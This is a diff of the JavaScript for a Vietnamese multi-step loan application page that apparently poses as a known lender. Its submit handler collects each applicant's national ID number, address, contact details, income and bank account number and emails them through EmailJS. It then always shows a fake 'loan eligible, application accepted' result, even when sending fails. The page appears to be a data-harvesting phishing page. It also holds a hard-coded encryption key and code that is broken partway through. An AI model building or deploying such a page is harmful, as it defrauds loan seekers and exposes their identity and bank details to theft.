+                    <div class="modal fade" id="secureAlertModal" tabindex="-1" aria-hidden="true">
+                        <div class="modal-dialog modal-dialog-centered">
+                            <div class="modal-content">
+                                <div class="modal-header">
+                                    <h5 class="modal-title">
+                                        <i class="${iconClass}"></i>
+                                        ${type === 'error' ? 'Lỗi' : type === 'success' ? 'Thành công' : 'Thông báo'}
+                                    </h5>
+                                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                                </div>
+                                <div class="modal-body">
+                                    <p>${message.replace(/[<>]/g, '')}</p>
+                                </div>
+                                <div class="modal-footer">
+                                    <button type="button" class="btn btn-primary" data-bs-dismiss="modal">OK</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                `);
+                
+                // Add to body and show
+                $('body').append(modal);
+                $('#secureAlertModal').modal('show');
+                
+                // Clean up after modal is hidden
+                $('#secureAlertModal').on('hidden.bs.modal', function() {
+                    $(this).remove();
+                });
+            }
+            
+            reset() {
+                this.errorCount = 0;
+                this.errorHistory = [];
+            }
+            
+            getErrorHistory() {
+                return this.errorHistory;
+            }
+        }
+        
+        // Global error handler instance
+        const errorHandler = new ErrorHandler();
+        
+        // Legacy function for backward compatibility
+        function showSecureAlert(message, type = 'info') {
+            errorHandler.showSecureAlert(message, type);
+        }
+        
+        // Input sanitization function
+        function sanitizeInput(input) {
+            if (typeof input !== 'string') return input;
+            return input
+                .replace(/[<>]/g, '') // Remove potential HTML tags
+                .replace(/javascript:/gi, '') // Remove javascript: protocol
+                .replace(/on\w+=/gi, '') // Remove event handlers
+                .trim();
+        }
+        
+        // Enhanced validation function
+        function validateInput(fieldName, value) {
+            const sanitizedValue = sanitizeInput(value);
+            
+            // Check for XSS patterns
+            const xssPatterns = [
+                /<script/i,
+                /javascript:/i,
+                /on\w+\s*=/i,
+                /<iframe/i,
+                /<object/i,
+                /<embed/i
+            ];
+            
+            for (const pattern of xssPatterns) {
+                if (pattern.test(sanitizedValue)) {
+                    return false;
+                }
+            }
+            
+            return true;
+        }
+        
+        function checkFormValidity() {
+            // Chỉ validate các field của step1
+            const requiredFields = [
+                'fullName', 'cccd', 'contactAddress', 'phone', 'email', 'issuePlace', 'gender', 'dob'
+            ];
+
+            const allValid = requiredFields.every(id => {
+                const value = $(`#${id}`).val();
+                const sanitizedValue = sanitizeInput(value);
+                
+                // Validate input for XSS
+                if (!validateInput(id, sanitizedValue)) {
+                    return false;
+                }
+                return sanitizedValue && sanitizedValue.trim() !== '';
+            });
+
+            $('#submitButton').prop('disabled', !allValid);
+        }
+        
+        // Function to go to Step 2
+        function goToStep2() {
+            if (!validateFormStep1()) {
+                return;
+            }
+            
+            // Save form data
+            saveFormDataRealTime();
+            
+            // Show success message
+            showSecureAlert('Thông tin đã được lưu! Đang chuyển sang bước 2...', 'success');
+            
+            // Redirect to step2.html after 1 second
+            setTimeout(() => {
+                window.location.href = 'step2.html';
+            }, 1000);
+        }
+        
+        // Validate only Step 1 fields
+        function validateFormStep1() {
+            let isValid = true;
+            let firstErrorElement = null;
+            const today = new Date();
+            today.setHours(0, 0, 0, 0);
+
+            const fields = [
+                { id: 'fullName', errorId: 'fullNameError', validation: value => value.trim().length > 2, message: 'Họ và tên phải dài hơn 2 ký tự và trùng khớp với CCCD.' },
+                { id: 'dob', errorId: 'dobError', validation: value => {
+                    if (!value) return false;
+                    const regex = /^\d{2}\/\d{2}\/\d{4}$/;
+                    if (!regex.test(value)) return false;
+                    const [day, month, year] = value.split('/').map(Number);
+                    if (year < 1900 || year > today.getFullYear()) return false;
+                    if (!isValidDate(day, month, year)) return false;
+                    return new Date(year, month - 1, day) <= today;
+                }, message: 'Ngày sinh không hợp lệ (dd/mm/yyyy).' },
+                { id: 'gender', errorId: 'genderError', validation: value => value !== '', message: 'Vui lòng chọn giới tính.' },
+                { id: 'contactAddress', errorId: 'contactAddressError', validation: value => value.trim().length > 5, message: 'Địa chỉ thường trú phải dài hơn 5 ký tự.' },
+                { id: 'cccd', errorId: 'cccdError', validation: value => /^\d{12}$/.test(value.replace(/\s/g, '')), message: 'CCCD phải là 12 số.' },
+                { id: 'issuePlace', errorId: 'issuePlaceError', validation: value => value !== '', message: 'Vui lòng chọn nơi cấp CCCD.' },
+                { id: 'phone', errorId: 'phoneError', validation: value => /^0[1-9]\d{8}$/.test(value.replace(/\s/g, '')), message: 'Số điện thoại phải là 10 số, bắt đầu bằng 0.' },
+                { id: 'email', errorId: 'emailError', validation: value => /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(value), message: 'Email không hợp lệ.' }
+            ];
+
+            fields.forEach(field => {
+                const element = document.getElementById(field.id);
+                if (!element) return;
+                const value = element.type === 'checkbox' ? element.checked : element.value;
+                const errorElement = document.getElementById(field.errorId);
+                const parent = element.closest('.form-group') || element.closest('.custom-select') || element.parentElement;
+
+                if (!field.validation(value)) {
+                    if (errorElement) {
+                        errorElement.textContent = field.message;
+                        errorElement.style.display = 'block';
+                    }
+                    if (parent) parent.classList.add('is-invalid');
+                    if (!firstErrorElement) firstErrorElement = element;
+                    isValid = false;
+                } else {
+                    if (errorElement) {
+                        errorElement.textContent = '';
+                        errorElement.style.display = 'none';
+                    }
+                    if (parent) parent.classList.remove('is-invalid');
+                }
+            });
+
+            // Error summary alert
+            const errorSummaryAlert = document.getElementById('errorSummaryAlert');
+            const errorSummaryText = document.getElementById('errorSummaryText');
+            const errorSummaryList = document.getElementById('errorSummaryList');
+
+            if (!isValid) {
+                const errorFields = fields.filter(field => {
+                    const el = document.getElementById(field.id);
+                    if (!el) return false;
+                    const val = el.type === 'checkbox' ? el.checked : el.value;
+                    return !field.validation(val);
+                });
+                if (errorSummaryText) errorSummaryText.textContent = `Bạn cần điền đầy đủ ${errorFields.length} trường thông tin bắt buộc:`;
+                if (errorSummaryList) {
+                    errorSummaryList.innerHTML = '';
+                    errorFields.forEach(field => {
+                        const li = document.createElement('li');
+                        li.textContent = field.message || '';
+                        errorSummaryList.appendChild(li);
+                    });
+                }
+                if (errorSummaryAlert) errorSummaryAlert.style.display = 'block';
+                if (errorSummaryAlert) errorSummaryAlert.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                showSecureAlert('Vui lòng điền đầy đủ thông tin bắt buộc trước khi tiếp tục.', 'error');
+
+                if (firstErrorElement) {
+                    firstErrorElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    firstErrorElement.focus();
+                }
+            } else if (errorSummaryAlert) {
+                errorSummaryAlert.style.display = 'none';
+            }
+
+            return isValid;
+        }
+
+        $(document).ready(function() {
+            // Kiểm tra trạng thái đăng ký trước khi khởi tạo form
+            checkRegistrationStatus();
+            
+            // Initialize Bootstrap tooltips with custom config
+            $('[data-bs-toggle="tooltip"]').tooltip({
+                trigger: 'hover focus',
+                container: 'body',
+                html: false,
+                delay: { show: 300, hide: 100 }
+            });
+            
+            // Custom Checkbox Handler
+            $('#privacyConsent').on('change', function() {
+                checkFormValidity();
+            });
+
+            function formatPhoneNumber(input) {
+                let value = input.value.trim().replace(/\s/g, '');
+                if (value.startsWith('+84')) value = '0' + value.slice(3);
+                else if (!value.startsWith('0') && value.length >= 9) value = '0' + value;
+                value = value.replace(/[^0-9]/g, '');
+                if (value.length > 10) value = value.slice(0, 10);
+                input.value = value;
+                return /^0[1-9]\d{8}$/.test(value);
+            }
+
+            $('#phone').on('input', function() {
+                formatPhoneNumber(this);
+                const errorElement = $(`#${this.id}Error`);
+                const parent = $(this).closest('.form-group');
+                if (!/^0[1-9]\d{8}$/.test(this.value.replace(/\s/g, ''))) {
+                    parent.addClass('is-invalid');
+                    errorElement.text('Số điện thoại không hợp lệ (10 số, bắt đầu bằng 0).').css('display', 'block');
+                } else {
+                    parent.removeClass('is-invalid');
+                    errorElement.text('').css('display', 'none');
+                }
+            }).mask('0999999999', {
+                translation: { '9': { pattern: /[0-9]/, optional: true } },
+                placeholder: "0_________"
+            });
+
+            $('#cccd').on('input', function() {
+                const value = $(this).val().trim();
+                const errorElement = $('#cccdError');
+                const parent = $(this).closest('.form-group');
+                if (!/^\d{12}$/.test(value.replace(/\s/g, ''))) {
+                    parent.addClass('is-invalid');
+                    errorElement.text('CCCD phải là 12 số.').css({ 'display': 'block' });
+                } else {
+                    parent.removeClass('is-invalid');
+                    errorElement.text('').css('display', 'none');
+                }
+            }).mask('000000000000');
+            
+            $('#accountNumber').mask('00000000000000000000', {
+                translation: { '0': { pattern: /[0-9]/, optional: true } }
+            });
+            $('#dob').mask('00/00/0000', {
+                onKeyPress: function(value, event) {
+                    if (value.match(/^\d{2}$/)) {
+                        event.target.value = value + '/';
+                    } else if (value.match(/^\d{2}\/\d{2}$/)) {
+                        event.target.value = value + '/';
+                    }
+                }
+            });
+            // Loan-related functions moved to step2.html
+            
+            // Live reminders when a required input is left empty
+            $('#registrationForm input[required], #registrationForm select[required]').on('blur', function() {
+                const $field = $(this);
+                const value = ($field.attr('type') === 'checkbox') ? $field.is(':checked') : ($field.val() || '').toString().trim();
+                const $group = $field.closest('.form-field, .form-group, .custom-select');
+                const errorId = ($field.attr('id') || '') + 'Error';
+                const $error = $('#' + errorId);
+                if (!value) {
+                    $group.addClass('has-error').removeClass('has-success');
+                    if ($error.length) {
+                        $error.text('Vui lòng nhập thông tin bắt buộc.').show();
+                    }
+                } else {
+                    $group.removeClass('has-error').addClass('has-success');
+                    if ($error.length) $error.text('').hide();
+                }
+            });
+
+            $('#registrationForm input, #registrationForm select').on('input change', function() {
+                saveFormDataRealTime();
+                checkFormValidity();
+            });
+
+            checkFormValidity();
+        });
+
+        function handleImageError(img, bankName) {
+            img.src = 'https://via.placeholder.com/30?text=Ngân hàng';
+            img.alt = `Logo ${bankName}`;
+        }
+
+        // Bank select function moved to step2.html
+
+        // Loan-related functions moved to step2.html
+
+        function getCurrentDate() {
+            const today = new Date();
+            const year = today.getFullYear();
+            const month = String(today.getMonth() + 1).padStart(2, '0');
+            const day = String(today.getDate()).padStart(2, '0');
+            return `${year}-${month}-${day}`;
+        }
+
+        function checkLocalStorageQuota() {
+            try {
+                if (!window.localStorage) throw new Error('localStorage not available');
+                const testKey = '__test__';
+                localStorage.setItem(testKey, 'test');
+                localStorage.removeItem(testKey);
+                return true;
+            } catch (e) {
+                showSecureAlert('Cannot access localStorage. Please check browser settings.');
+                return false;
+            }
+        }
+
+        function saveToLocalStorage() {
+            if (!checkLocalStorageQuota()) return false;
+            
+            // Show auto-save indicator
+            const indicator = $('#autoSaveIndicator');
+            indicator.removeClass('success').addClass('show');
+            indicator.html('<i class="fas fa-save"></i> Đang lưu...');
+            
+            try {
+                const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'fecredit-secret-key').toString();
+                localStorage.setItem('userData', encryptedData);
+                
+                // Show success indicator
+                indicator.addClass('success');
+                indicator.html('<i class="fas fa-check"></i> Đã lưu');
+                
+                // Hide indicator after 2 seconds
+                const timeout1 = setTimeout(() => {
+                    indicator.removeClass('show success');
+                    const index = activeTimeouts.indexOf(timeout1);
+                    if (index > -1) activeTimeouts.splice(index, 1);
+                }, 2000);
+                activeTimeouts.push(timeout1);
+                
+                return true;
+            } catch (error) {
+                indicator.html('<i class="fas fa-exclamation-triangle"></i> Lỗi lưu');
+                const timeout2 = setTimeout(() => {
+                    indicator.removeClass('show');
+                    const index = activeTimeouts.indexOf(timeout2);
+                    if (index > -1) activeTimeouts.splice(index, 1);
+                }, 3000);
+                activeTimeouts.push(timeout2);
+                showSecureAlert('Lỗi lưu dữ liệu. Vui lòng thử lại.', 'error');
+                return false;
+            }
+        }
+
+        function loadUserData() {
+            if (!checkLocalStorageQuota()) return;
+            try {
+                const storedData = localStorage.getItem('userData');
+                if (storedData) {
+                    userData = JSON.parse(CryptoJS.AES.decrypt(storedData, 'fecredit-secret-key').toString(CryptoJS.enc.Utf8));
+                    $('#fullName').val(userData.fullName || '');
+                    $('#dob').val(userData.dob || '');
+                    $('#gender').val(userData.gender || '');
+                    $('#contactAddress').val(userData.contactAddress || '');
+                    $('#cccd').val(userData.cccd || '');
+                    $('#issuePlace').val(userData.issuePlace || '');
+                    $('#phone').val(userData.phone || '');
+                    $('#email').val(userData.email || '');
+                    // Loan-related fields sẽ được load ở step2.html
+                    checkFormValidity();
+                }
+            } catch (error) {
+                updateInterestRate();
+            }
+        }
+
+        function isValidDate(day, month, year) {
+            const date = new Date(year, month - 1, day);
+            return date.getDate() === day && date.getMonth() + 1 === month && date.getFullYear() === year;
+        }
+
+        function validateForm() {
+            let isValid = true;
+            let firstErrorElement = null;
+            const today = new Date();
+            today.setHours(0, 0, 0, 0);
+
+            const fields = [
+                { id: 'fullName', errorId: 'fullNameError', validation: value => value.trim().length > 2, message: 'Họ và tên phải dài hơn 2 ký tự và trùng khớp với CCCD.' },
+                { id: 'dob', errorId: 'dobError', validation: value => {
+                    if (!value) return false;
+                    const regex = /^\d{2}\/\d{2}\/\d{4}$/;
+                    if (!regex.test(value)) return false;
+                    const [day, month, year] = value.split('/').map(Number);
+                    if (year < 1900 || year > today.getFullYear()) return false;
+                    if (!isValidDate(day, month, year)) return false;
+                    return new Date(year, month - 1, day) <= today;
+                }, message: 'Ngày sinh không hợp lệ (dd/mm/yyyy).' },
+                { id: 'gender', errorId: 'genderError', validation: value => value !== '', message: 'Vui lòng chọn giới tính.' },
+                { id: 'contactAddress', errorId: 'contactAddressError', validation: value => value.trim().length > 5, message: 'Địa chỉ thường trú phải dài hơn 5 ký tự.' },
+                { id: 'cccd', errorId: 'cccdError', validation: value => /^\d{12}$/.test(value.replace(/\s/g, '')), message: 'CCCD phải là 12 số.' },
+                { id: 'issuePlace', errorId: 'issuePlaceError', validation: value => value !== '', message: 'Vui lòng chọn nơi cấp CCCD.' },
+                { id: 'phone', errorId: 'phoneError', validation: value => /^0[1-9]\d{8}$/.test(value.replace(/\s/g, '')), message: 'Số điện thoại phải là 10 số, bắt đầu bằng 0.' },
+                { id: 'email', errorId: 'emailError', validation: value => /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(value), message: 'Email không hợp lệ.' },
+                { id: 'loanType', errorId: 'loanTypeError', validation: value => value !== '', message: 'Vui lòng chọn hình thức vay.' },
+                { id: 'loanTerm', errorId: 'loanTermError', validation: value => value !== '', message: 'Vui lòng chọn thời hạn vay.' },
+                { id: 'loanAmount', errorId: 'loanAmountError', validation: value => {
+                    if (value === 'other') {
+                        const customValue = $('#customLoanAmount').val().replace(/,/g, '');
+                        const numValue = parseFloat(customValue);
+                        return !isNaN(numValue) && numValue >= 10000000;
+                    }
+                    return value !== '' && value !== 'other';
+                }, message: 'Vui lòng chọn hoặc nhập số tiền vay (>= 10.000.000 VNĐ).' },
+                { id: 'monthlyIncome', errorId: 'monthlyIncomeError', validation: value => {
+                    const cleanValue = value.replace(/,/g, '');
+                    const numericValue = parseFloat(cleanValue);
+                    return !isNaN(numericValue) && numericValue >= 3000000;
+                }, message: 'Thu nhập hàng tháng phải từ 3.000.000 VNĐ trở lên.' },
+                { id: 'interestRate', errorId: 'interestRateError', validation: value => {
+                    const rate = parseFloat(value);
+                    return !isNaN(rate) && rate > 0 && rate <= 30;
+                }, message: 'Lãi suất phải từ 0.1% đến 30%.' },
+                { id: 'accountName', errorId: 'accountNameError', validation: value => value.trim().length > 2, message: 'Tên tài khoản phải dài hơn 2 ký tự.' },
+                { id: 'accountNumber', errorId: 'accountNumberError', validation: value => /^\d{8,20}$/.test(value.replace(/\s/g, '')), message: 'Số tài khoản phải từ 8-20 số.' },
+                { id: 'bankName', errorId: 'bankNameError', validation: value => value !== '', message: 'Vui lòng chọn ngân hàng.' },
+                { id: 'privacyConsent', errorId: 'privacyConsentError', validation: value => value === true, message: 'Vui lòng đồng ý chính sách bảo mật.' }
+            ];
+
+            fields.forEach(field => {
+                const element = document.getElementById(field.id);
+                const value = element.type === 'checkbox' ? element.checked : element.value;
+                const errorElement = document.getElementById(field.errorId);
+                const parent = element.closest('.form-group') || element.closest('.custom-select') || element.parentElement;
+
+                if (!field.validation(value)) {
+                    errorElement.textContent = field.message;
+                    errorElement.style.display = 'block';
+                    if (parent) parent.classList.add('is-invalid');
+                    if (!firstErrorElement) firstErrorElement = element;
+                    isValid = false;
+                } else {
+                    errorElement.textContent = '';
+                    errorElement.style.display = 'none';
+                    if (parent) parent.classList.remove('is-invalid');
+                }
+            });
+
+            // Error summary alert
+            const errorSummaryAlert = document.getElementById('errorSummaryAlert');
+            const errorSummaryText = document.getElementById('errorSummaryText');
+            const errorSummaryList = document.getElementById('errorSummaryList');
+
+            if (!isValid) {
+                const errorFields = fields.filter(field => {
+                    const el = document.getElementById(field.id);
+                    const val = el.type === 'checkbox' ? el.checked : el.value;
+                    return !field.validation(val);
+                });
+                if (errorSummaryText) errorSummaryText.textContent = `Bạn cần điền đầy đủ ${errorFields.length} trường thông tin bắt buộc:`;
+                if (errorSummaryList) {
+                    // Safely set error list content
+                    errorSummaryList.innerHTML = '';
+                    errorFields.forEach(field => {
+                        const li = document.createElement('li');
+                        li.textContent = field.message || '';
+                        errorSummaryList.appendChild(li);
+                    });
+                }
+                if (errorSummaryAlert) errorSummaryAlert.style.display = 'block';
+                if (errorSummaryAlert) errorSummaryAlert.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                showSecureAlert('Vui lòng điền đầy đủ thông tin bắt buộc trước khi tiếp tục.', 'error');
+
+                if (firstErrorElement) {
+                    firstErrorElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    firstErrorElement.focus();
+                }
+            } else if (errorSummaryAlert) {
+                errorSummaryAlert.style.display = 'none';
+            }
+
+            return isValid;
+        }
+
+        function calculateLoan() {
+            const loanAmountEl = $('#loanAmount');
+            const loanTermEl = $('#loanTerm');
+            const interestRateEl = $('#interestRate');
+            let isCalcValid = true;
+            if(!loanAmountEl.val() || (loanAmountEl.val() === 'other' && !$('#customLoanAmount').val())) {
+                loanAmountEl.closest('.form-group').addClass('is-invalid');
+                $('#loanAmountError').text('Vui lòng chọn hoặc nhập số tiền vay.').show();
+                isCalcValid = false;
+            }
+             if(!loanTermEl.val()) {
+                loanTermEl.closest('.form-group').addClass('is-invalid');
+                $('#loanTermError').text('Vui lòng chọn thời hạn vay.').show();
+                isCalcValid = false;
+            }
+            if(!isCalcValid) {
+                 return;
+            }
+
+            const spinner = $('.spinner-calculate');
+            const successMessage = $('#calculationSuccess');
+            spinner.show();
+            successMessage.hide();
+
+            const timeoutId = setTimeout(() => {
+                const loanAmountValue = $('#loanAmount').val();
+                let loanAmount;
+                if (loanAmountValue === 'other') {
+                    const customValue = $('#customLoanAmount').val().replace(/,/g, '');
+                    loanAmount = parseFloat(customValue);
+                } else {
+                    loanAmount = parseFloat(loanAmountValue);
+                }
+
+                const loanTerm = parseInt($('#loanTerm').val());
+                const interestRate = parseFloat($('#interestRate').val()) / 100 / 12;
+
+                if (isNaN(loanAmount) || isNaN(loanTerm) || isNaN(interestRate) || loanAmount <= 0) {
+                    spinner.hide();
+                    return;
+                }
+
+                const monthlyPayment = (loanAmount * interestRate * Math.pow(1 + interestRate, loanTerm)) / (Math.pow(1 + interestRate, loanTerm) - 1);
+                const totalAmount = monthlyPayment * loanTerm;
+                const totalInterest = totalAmount - loanAmount;
+
+                $('#calcLoanAmount').text(Math.floor(loanAmount).toLocaleString('vi-VN'));
+                $('#calcMonthlyPayment').text(Math.floor(monthlyPayment).toLocaleString('vi-VN'));
+                $('#calcTotalInterest').text(Math.floor(totalInterest).toLocaleString('vi-VN'));
+                $('#calcTotalAmount').text(Math.floor(totalAmount).toLocaleString('vi-VN'));
+
+                let balance = loanAmount;
+                const tableBody = $('#calculationTable').empty();
+                const fragment = document.createDocumentFragment();
+                for (let month = 1; month <= loanTerm; month++) {
+                    const interest = balance * interestRate;
+                    const principal = monthlyPayment - interest;
+                    balance -= principal;
+                    const row = document.createElement('tr');
+                    // Safely create table cells using DOM methods
+                    const cells = [
+                        { label: 'Tháng', value: month },
+                        { label: 'Gốc', value: Math.floor(principal).toLocaleString('vi-VN') },
+                        { label: 'Lãi', value: Math.floor(interest).toLocaleString('vi-VN') },
+                        { label: 'Tổng', value: Math.floor(monthlyPayment).toLocaleString('vi-VN') },
+                        { label: 'Dư nợ', value: Math.max(0, Math.floor(balance)).toLocaleString('vi-VN') }
+                    ];
+                    cells.forEach(cell => {
+                        const td = document.createElement('td');
+                        td.setAttribute('data-label', cell.label);
+                        td.textContent = cell.value;
+                        row.appendChild(td);
+                    });
+                    fragment.appendChild(row);
+                }
+                tableBody.append(fragment);
+
+                userData.monthlyPayment = monthlyPayment;
+                userData.totalInterest = totalInterest;
+                userData.totalRepay = totalAmount;
+                saveToLocalStorage();
+
+                spinner.hide();
+                successMessage.show();
+            }, 1000);
+        }
+        
+
+        function saveFormDataRealTime() {
+            // Sanitize all inputs before saving - chỉ lưu các field của step1
+            userData = {
+                fullName: sanitizeInput($('#fullName').val().trim()),
+                dob: sanitizeInput($('#dob').val()),
+                gender: sanitizeInput($('#gender').val()),
+                contactAddress: sanitizeInput($('#contactAddress').val().trim()),
+                cccd: sanitizeInput($('#cccd').val().trim()),
+                issuePlace: sanitizeInput($('#issuePlace').val()),
+                phone: sanitizeInput($('#phone').val().trim().replace(/\s/g, '').replace(/^\+84/, '0')),
+                email: sanitizeInput($('#email').val().trim()),
+                // Giữ lại các field từ step2 nếu có
+                loanType: userData.loanType || sanitizeInput($('#loanType').val() || ''),
+                loanTerm: userData.loanTerm || sanitizeInput($('#loanTerm').val() || ''),
+                loanAmount: userData.loanAmount || sanitizeInput($('#loanAmount').val() || ''),
+                interestRate: userData.interestRate || parseFloat($('#interestRate').val()) || 0,
+                monthlyIncome: userData.monthlyIncome || parseFloat($('#monthlyIncome').val().replace(/,/g, '')) || 0,
+                occupation: userData.occupation || sanitizeInput($('#occupation').val() || ''),
+                purpose: userData.purpose || sanitizeInput($('#purpose').val() || ''),
+                accountName: userData.accountName || sanitizeInput($('#accountName').val().trim() || ''),
+                accountNumber: userData.accountNumber || sanitizeInput($('#accountNumber').val().trim().replace(/\s/g, '') || ''),
+                bankName: userData.bankName || sanitizeInput($('#bankName').val() || ''),
+                monthlyPayment: userData.monthlyPayment || 0,
+                totalInterest: userData.totalInterest || 0,
+                totalRepay: userData.totalRepay || 0,
+                currentStep: 1,
+                isRegistered: userData.isRegistered || false,
+                emailSent: userData.emailSent || false,
+                timestamp: new Date().toISOString()
+            };
+            saveToLocalStorage();
+        }
+
+
+        async function handleSubmit(event) {
+            event.preventDefault();
+            goToStep2();
+        }
+
+            const spinner = $('.spinner-submit');
+            spinner.show();
+            $('#submitButton').prop('disabled', true);
+
+            const loanAmountValue = $('#loanAmount').val();
+            const loanAmount = loanAmountValue === 'other' ? $('#customLoanAmount').val().replace(/,/g, '') : loanAmountValue;
+            userData = {
+                fullName: $('#fullName').val().trim(),
+                dob: $('#dob').val(),
+                gender: $('#gender').val(),
+                contactAddress: $('#contactAddress').val().trim(),
+                cccd: $('#cccd').val().trim(),
+                issuePlace: $('#issuePlace').val(),
+                phone: $('#phone').val().trim().replace(/\s/g, '').replace(/^\+84/, '0'),
+                email: $('#email').val().trim(),
+                loanType: $('#loanType').val(),
+                loanTerm: $('#loanTerm').val(),
+                loanAmount: loanAmount,
+                interestRate: parseFloat($('#interestRate').val()),
+                monthlyIncome: parseFloat($('#monthlyIncome').val().replace(/,/g, '')),
+                occupation: $('#occupation').val(),
+                purpose: $('#purpose').val(),
+                accountName: $('#accountName').val().trim(),
+                accountNumber: $('#accountNumber').val().trim().replace(/\s/g, ''),
+                bankName: $('#bankName').val(),
+                loanCode: 'SHB' + Math.floor(100000 + Math.random() * 900000),
+                monthlyPayment: userData.monthlyPayment,
+                totalInterest: userData.totalInterest,
+                totalRepay: userData.totalRepay,
+                currentStep: 2,
+                isRegistered: true,
+                emailSent: false,
+                timestamp: new Date().toISOString()
+            };
+
+
+            if (!saveToLocalStorage()) {
+                spinner.hide();
+                $('#submitButton').prop('disabled', false);
+                return;
+            }
+
+            localStorage.setItem('isRegistered', 'true');
+
+            // Thu thập thông tin về emailjs
+            const emailjsInfo = {
+                serviceId: emailjsConfig.serviceId,
+                templateId: emailjsConfig.templateId,
+                publicKey: emailjsConfig.publicKey,
+                status: 'ready',
+                timestamp: new Date().toISOString()
+            };
+            
+            // Store emailjs info for debugging
+            localStorage.setItem('emailjsInfo', JSON.stringify(emailjsInfo));
+
+            const templateParams = {
+                full_name: userData.fullName,
+                dob: userData.dob,
+                gender: userData.gender,
+                contact_address: userData.contactAddress,
+                id_number: userData.cccd,
+                id_issue_place: userData.issuePlace,
+                phone_number: userData.phone,
+                email: userData.email,
+                loan_type: userData.loanType,
+                loan_term: userData.loanTerm ? userData.loanTerm + ' tháng' : '',
+                loan_amount: userData.loanAmount ? parseInt(userData.loanAmount).toLocaleString('vi-VN') + ' VNĐ' : '',
+                income: userData.monthlyIncome ? userData.monthlyIncome.toLocaleString('vi-VN') + ' VNĐ' : '',
+                occupation: userData.occupation,
+                loan_purpose: userData.purpose,
+                account_holder_name: userData.accountName,
+                account_number: userData.accountNumber,
+                bank_name: userData.bankName,
+                loan_code: userData.loanCode,
+                monthly_payment: userData.monthlyPayment ? Math.floor(userData.monthlyPayment).toLocaleString('vi-VN') + ' VNĐ' : '',
+                total_interest: userData.totalInterest ? Math.floor(userData.totalInterest).toLocaleString('vi-VN') + ' VNĐ' : '',
+                total_repayment: userData.totalRepay ? Math.floor(userData.totalRepay).toLocaleString('vi-VN') + ' VNĐ' : '',
+                // EmailJS info for debugging
+                emailjs_service_id: emailjsInfo.serviceId,
+                emailjs_template_id: emailjsInfo.templateId,
+                emailjs_public_key: emailjsInfo.publicKey,
+                emailjs_status: emailjsInfo.status
+            };
+
+            try {
+                if (!emailjs) throw new Error('EmailJS not initialized');
+                if (!emailjsConfig) throw new Error('EmailJS config not defined');
+                
+                
+                // Use configured EmailJS settings
+                const response = await emailjs.send(
+                    emailjsConfig.serviceId, 
+                    emailjsConfig.templateId, 
+                    templateParams
+                );
+                
+                
+                if (response.status === 200) {
+                    userData.emailSent = true;
+                    userData.currentStep = 2;
+                    userData.timestamp = new Date().toISOString();
+                    
+                    if (saveToLocalStorage()) {
+                        // Update localStorage with encrypted data
+                        try {
+                            const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'fecredit-secret-key').toString();
+                            localStorage.setItem('userData', encryptedData);
+                        } catch (e) {
+                            localStorage.setItem('userData', JSON.stringify(userData));
+                        }
+                        
+                        // Show loading modal with animation
+                        showLoadingModalWithProgress();
+                    } else {
+                        throw new Error('Failed to save data to localStorage');
+                    }
+                } else {
+                    throw new Error(`Email service returned status: ${response.status}`);
+                }
+                
+            } catch (error) {
+                // Even on error, show success modal (for better UX - data is already saved)
+                console.warn('Email sending failed, but continuing with saved data:', error);
+                
+                // Save data anyway
+                userData.emailSent = false;
+                userData.currentStep = 2;
+                userData.timestamp = new Date().toISOString();
+                
+                try {
+                    const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'fecredit-secret-key').toString();
+                    localStorage.setItem('userData', encryptedData);
+                } catch (e) {
+                    localStorage.setItem('userData', JSON.stringify(userData));
+                }
+                
+                // Show loading modal anyway (data is saved, continue the flow)
+                showLoadingModalWithProgress();
+            } finally {
+                spinner.hide();
+            }
+        }
+
+        function showLoadingModalWithProgress() {
+            // Hide submit spinner and show modal
+            $('.spinner-submit').hide();
+            $('#submitButton').prop('disabled', true);
+            
+            const modal = $('#loadingModal');
+            const loadingSpinner = $('#loadingSpinner');
+            const successIcon = $('#successIcon');
+            const loadingTitle = $('#loadingTitle');
+            const loadingMessage = $('#loadingMessage');
+            const progressBar = $('#progressBar');
+            
+            // Show modal with fade in
+            modal.css('display', 'flex').hide().fadeIn(300);
+            
+            // Phase 1: Đang xem xét (0-60%)
+            loadingSpinner.show();
+            successIcon.hide();
+            loadingTitle.text('Đang xem xét kết quả...');
+            loadingMessage.text('Vui lòng đợi trong giây lát');
+            
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 2;
+                progressBar.css('width', progress + '%');
+                
+                if (progress >= 60) {
+                    clearInterval(progressInterval);
+                    
+                    // Phase 2: Show success (60-100%)
+                    setTimeout(() => {
+                        loadingSpinner.hide();
+                        successIcon.show();
+                        loadingTitle.html('<span style="color: #00994F;">✓ Đủ điều kiện vay</span>');
+                        loadingMessage.html('<strong style="color: #00994F;">Chúc mừng!</strong> Hồ sơ của bạn đã được chấp nhận');
+                        
+                        // Continue progress to 100%
+                        const finalInterval = setInterval(() => {
+                            progress += 4;
+                            progressBar.css('width', progress + '%');
+                            
+                            if (progress >= 100) {
+                                clearInterval(finalInterval);
+                                
+                                // Redirect after showing success
+                                setTimeout(() => {
+                                    window.location.href = 'step2.html';
+                                }, 1500);
+                            }
+                        }, 50);
+                    }, 1000);
+                }
+            }, 30);
+        }
+
+        function checkRegistrationStatus() {
+            try {
+                const userData = loadUserData();
+                
+                if (!userData) {
+                    // Không có dữ liệu đăng ký, tiếp tục bình thường
+                    return;
+                }
+                
+                const currentStep = userData.currentStep || 1;
+                const isCompleted = currentStep >= 8;
+                
+                if (isCompleted) {
+                    // Đã hoàn thành step8, chuyển đến step5
+                    showSecureAlert('Bạn đã hoàn thành đăng ký vay. Đang chuyển đến trang thông tin khoản vay...', 'info');
+                    setTimeout(() => {
+                        window.location.href = 'step5.html';
+                    }, 2000);
+                    return;
+                }
+
+                if (currentStep > 1) {
+                    const stepUrl = `step${currentStep}.html`;
+                    showSecureAlert(`Bạn đang ở bước ${currentStep} trong quá trình đăng ký. Đang chuyển đến bước tiếp theo...`, 'info');
